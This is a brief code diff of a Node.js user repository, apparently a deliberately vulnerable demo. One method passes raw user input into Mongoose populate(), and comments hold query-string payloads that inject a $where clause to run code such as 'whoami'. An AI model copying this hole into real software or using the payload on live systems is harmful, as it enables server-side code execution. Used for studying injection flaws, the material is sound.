@@ -18,8 +18,6 @@ class UserRepository {
         console.log(`\nimage_url: `, imagePath)
         return await User.updateOne({ email: email }, {
             $set: {
-                // bio: bio,
-                // location: location,
                 avatar_url: imagePath
             },
             $currentDate: { lastUpdated: true }
@@ -29,8 +27,10 @@ class UserRepository {
 
     static async getUserProductsByName(name, unsanitizedInput) {
         try {
+            console.log(unsanitizedInput, typeof unsanitizedInput)
             // not avaible in the free mongo db cluster
             return User.findOne({ name: name }).populate(unsanitizedInput)
+
             // products[path]=products&products[match][][$or][][$where]=typeof%20global%20!=%20'undefined'%20%3F%20whoami%20%3A%201
             //products[path]=prodts&products[match][][$or][][$where]=typeof%20global%20!=%20'undefined'%20%3F%20whoami%20%3A%201
             // return User.findOne({ name: name }).populate({
